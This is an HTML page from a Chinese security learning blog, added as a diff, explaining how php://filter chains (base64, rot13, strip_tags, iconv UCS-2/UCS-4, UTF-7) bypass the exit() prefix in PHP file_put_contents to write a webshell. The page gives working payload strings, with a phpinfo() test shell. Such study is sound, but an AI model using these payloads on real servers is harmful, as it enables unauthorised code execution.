@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">学习关于file_put_contents死亡退出的绕过 | 0xGeekCat</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "Mаксим0xGeekCat";
+  mashiro_option.author_name = "0xGeekCat";
+  mashiro_option.site_url = "https://0xgeekcat.github.io/";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com%20ls%20black_hair%20f%20toriki%20touhou.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-293503-ghostblade-long_hair-red_hair-sword-tagme_character-thighhighs-weapon-wlop-scaled.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-298784-aeolian_wlop-barefoot-black_hair-braids-ghostblade-headdress-long_hair-ponytail-wlop-scaled.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com%20-%20227403%20black_hair%20ghostblade%20jade_(wlop)%20japanese_clothes%20kimono%20logo%20realistic%20short_hair%20tattoo%20umbrella%20wlop.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-281267-aeolian_wlop-black_hair-bow_weapon-close-ghostblade-green_eyes-logo-long_hair-realistic-watermark-weapon-wink-wlop-scaled.jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dim">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://0xgeekcat.github.io/">
+          <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="https://github.com/0xGeekCat" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=1292881925@qq.com" target="_blank" class="social-github" title="email">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/email.svg">
+                  </a>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/wechat.jpg">
+                  </div>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">Mаксим</span>
+            <span class="shironeko">0xGeekCat</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E7%94%9F%E6%B4%BB/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          生活
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E8%BD%AC%E8%BD%BD/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          转载
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    书单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/tags/%E5%B7%B2%E8%AF%BB/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          已读
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/%E6%9C%AA%E8%AF%BB/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          未读
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+          <header class="entry-header">
+            <h1 class="entry-title">学习关于file_put_contents死亡退出的绕过</h1>
+            <p class="entry-census">0xGeekCat&nbsp;·&nbsp;2020-8-12&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+
+            <hr>
+          </header>
+        
+        <div class="entry-content">
+          <h1 id="php-filter的使用"><a href="#php-filter的使用" class="headerlink" title="php://filter的使用"></a>php://filter的使用</h1><p>为了读取包含有敏感信息的PHP等源文件，我们就要先将”可能引发冲突的PHP代码”编码一遍，这里就会用到<code>php://filter</code></p>
+<p><code>php://filter</code>是PHP语言中特有的协议流，作用是作为一个”中间流”来处理其他流，其之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容又有可能和标准XML冲突，从而导致出错</p>
+<h1 id="file-put-contents-filename-”-lt-php-exit-”-content"><a href="#file-put-contents-filename-”-lt-php-exit-”-content" class="headerlink" title="file_put_contents($filename,”&lt;?php exit();”.$content);"></a>file_put_contents($filename,”&lt;?php exit();”.$content);</h1><p><code>$filename</code>控制的写入的文件名，<code>$content</code>拼接在了<code>&lt;?php exit();</code>后，所以想要GetShell的话，就必须把<code>&lt;?php exit();</code>给干掉，而都知道<code>$filename</code>控制文件名，如果我们使用<strong>php://filter</strong>协议，先按<strong>php://filter</strong>规定的协议对<code>$content</code>进行解码后再写入协议，更强大的是<strong>php://filter</strong>还支持使用多个过滤器规则，也就是说可以连环操作。所以思路很简单，目标就是把<code>&lt;?php exit();</code>解码为php不认识的字符，而我们构造的内容能够正常的解码出来就可以</p>
+<h2 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h2><p>最常用的就是base64编码，通过解码把<code>&lt;?php exit();</code>解码为乱码，而后面我们传入的webshell的base64内容被正常解码，就可以直接干掉<code>&lt;?php exit();</code>得到一个shell了,不过由于<code>&lt;?php exit();</code>中只有phpexit参与了解码，由于base64解码时4转3,所以需要补一位</p>
+<pre><code class="php">$content = &lt;?php phpinfo();?&gt; 👉 PD9waHAgcGhwaW5mbygpOz8+ 👉 aPD9waHAgcGhwaW5mbygpOz8+
+$filename = php://filter/write=convert.base64-decode/resource=geekcat.php</code></pre>
+<p>![截屏2020-08-12 下午9.19.26](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.19.26.png)</p>
+<p>![截屏2020-08-12 下午9.19.59](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.19.59.png)</p>
+<h2 id="Rot13编码"><a href="#Rot13编码" class="headerlink" title="Rot13编码"></a>Rot13编码</h2><pre><code class="php">$content = &lt;?php phpinfo();?&gt; 👉 &lt;?cuc cucvasb();?&gt;
+$filename = php://filter/write=string.rot13/resource=geekcat.php</code></pre>
+<p>![截屏2020-08-12 下午9.23.24](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.23.24.png)</p>
+<p>![截屏2020-08-12 下午9.23.03](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.23.03.png)</p>
+<p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用(默认情况是没开启: <strong>php.ini</strong>中的<code>short_open_tag</code>)</p>
+<h2 id="组合拳"><a href="#组合拳" class="headerlink" title="组合拳"></a>组合拳</h2><p>可以利用<code>php://filter</code>字符串处理方法组合编码的方法绕过<code>&lt;?php exit();</code>，相对于直接编码就有点多此一举了，不过知道有这个方法就好，例如利用<code>strip_tags</code>方法来<strong>直接去除xml</strong>，而我们传入的shell经过base64编码，所以不会被去除，再解码即可，<code>php://filter</code>支持使用多个过滤器</p>
+<pre><code class="php">$content = &lt;?php phpinfo();?&gt; 👉 PD9waHAgcGhwaW5mbygpOz8+ 👉 ?&gt;PD9waHAgcGhwaW5mbygpOz8+ #&lt;?php exit();不是完整的标签所以需要补全?&gt;
+$filename = php://filter/write=string.strip_tags|convert.base64-decode/resource=geekcat.php  </code></pre>
+<p>先去除xml标签之后再进行base64解码</p>
+<p>![截屏2020-08-12 下午9.38.35](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.38.35.png)</p>
+<p>![截屏2020-08-12 下午9.37.07](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.37.07.png)</p>
+<h1 id="file-put-contents-a-”-lt-php-exit-”-a"><a href="#file-put-contents-a-”-lt-php-exit-”-a" class="headerlink" title="file_put_contents($a,”&lt;?php exit();”.$a);"></a>file_put_contents($a,”&lt;?php exit();”.$a);</h1><p>此时仅有一个变量，原理相同</p>
+<h2 id="Base64编码-1"><a href="#Base64编码-1" class="headerlink" title="Base64编码"></a>Base64编码</h2><p>同样利用<code>php://filter</code>来构造，反正后面是写入的内容，只要在后面解码的时候把shell解码出来，不需要的东西解码成乱码即可</p>
+<pre><code class="php">$a = php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=geekcat.php</code></pre>
+<p>构造的shell可以放在<strong>过滤器的位置</strong>和文件名位置都可以(其他编码有时候会有空格什么的乱码，<strong>文件名不一定好用</strong>)，**<code>php://filter</code>面对不可用的规则报Warning，然后跳过继续执行的(不会退出)**</p>
+<p>在<code>convert.base64-decode</code>解码过程中会先自动过滤掉出来<code>[A-Za-z0-9+/]</code>以为的字符👇</p>
+<pre><code class="php">php//filter/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=geekcat.php</code></pre>
+<p>默认情况下base64编码是以 <code>=</code> 作为结尾，<strong>正常解码的时候到了 <code>=</code> 就解码结束</strong>，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的 <code>=</code> 也过不掉，所以导致过滤器解码失败，从而报错(不过还是会创建文件)</p>
+<p><strong>此方法目前暂不可行</strong></p>
+<h2 id="Rot13编码-1"><a href="#Rot13编码-1" class="headerlink" title="Rot13编码"></a>Rot13编码</h2><pre><code class="php">$a = php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=geekcat.php</code></pre>
+<p>![截屏2020-08-12 下午10.01.47](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午10.01.47.png)</p>
+<p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用，Linux环境默认不开启<code>short_open_tag</code></p>
+<h2 id="iconv字符编码转换"><a href="#iconv字符编码转换" class="headerlink" title="iconv字符编码转换"></a>iconv字符编码转换</h2><p>iconv — 字符串按要求的字符编码转换</p>
+<p>将字符串<code>str</code>从<code>in_charset</code>转换编码到<code>out_charset</code></p>
+<pre><code class="php">iconv ( string $in_charset , string $out_charset , string $str ) : string</code></pre>
+<p>通过字符转换把<code>&lt;?php exit();</code>转成不能解析的字符串，👇采用的是UCS-2或者UCS-4编码方式</p>
+<p>![截屏2020-08-12 下午10.22.23](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午10.22.23.png)</p>
+<p>![截屏2020-08-12 下午10.22.42](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午10.22.42.png)</p>
+<p>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位反转，构造需要数据是<strong>UCS-2或UCS-4中2或者4的倍数，不然不能反转</strong>，利用这种过滤器进行编码转换绕过</p>
+<pre><code class="php">$a = &#39;php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=geekcat.php&#39;;
+
+$a = &#39;php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=geekcat.php&#39;;
+# UCS-4为4位一反转，所以在与&lt;?php exit(); 拼接时要xxx👆</code></pre>
+<h2 id="组合拳-1"><a href="#组合拳-1" class="headerlink" title="组合拳"></a>组合拳</h2><h3 id="第一套连招"><a href="#第一套连招" class="headerlink" title="第一套连招"></a>第一套连招</h3><pre><code class="php">$a = &#39;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=Cyc1e.php&#39;; </code></pre>
+<h3 id="第二套连招"><a href="#第二套连招" class="headerlink" title="第二套连招"></a>第二套连招</h3><p>单独用base64编码是不可行的，但组合拳可行，通过iconv将utf8编码转为utf7编码，从而转换<code>=</code> ，就不会影响到base64的解码</p>
+<p>![截屏2020-08-12 下午10.42.26](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午10.42.26.png)</p>
+<p>![截屏2020-08-12 下午10.43.23](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午10.43.23.png)</p>
+<h3 id="第三套连招"><a href="#第三套连招" class="headerlink" title="第三套连招"></a>第三套连招</h3><p>用strip_tags方法&amp;&amp;base64的组合，因为strip_tags去除的是完整的标签以及内容，而base64要求中间不能出现 <code>=</code> 所以把二者组合</p>
+<pre><code class="php">$a = &#39;php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php&#39;;</code></pre>
+<p>文件名前加上<code>?&gt;</code>把<code>&lt;?php exit();</code>闭合，同时<code>=</code>也在闭合标签之间，利用strip_tags直接把<code>&lt;?php ...... ?&gt;</code>内的所有内容删除，然后对剩下的部分进行base64解码</p>
+<p><strong>这种构造在Windows中不行，因为Windows不支持文件名中有<code>?</code>、<code>&gt;</code>这类字符</strong></p>
+<p>可以利用<code>../</code>来重新构造文件名<code>?&gt;PD9waHAgcGhwaW5mbygpOz8+/../geekcat.php</code></p>
+<p>把<code>?&gt;PD9waHAgcGhwaW5mbygpOz8+</code>作为目录名(不管存不存在)，再用<code>../</code>回退，这样就可以创建出自定义的文件名</p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="%5Bhttps://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/%5D(https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/)">关于file_put_contents的一些小测试</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p>
+<p><strong>郑重感谢</strong></p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/wechat.png"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/%E5%AD%A6%E4%B9%A0WMCTF2020-Checkin2.html" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                学习WMCTF2020-Checkin2</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/%E5%AD%A6%E4%B9%A0PHP%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8.html" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                学习PHP临时文件机制与利用</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="https://0xgeekcat.github.io/" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg" itemprop="image" alt="0xGeekCat" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="https://0xgeekcat.github.io/" itemprop="url" rel="author">0xGeekCat</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 0xGeekCat<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2018</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1","name":"/video/The-Pet-Girl-of-Sakurasou.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1","name":"/video/The-Pet-Girl-of-Sakurasou.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
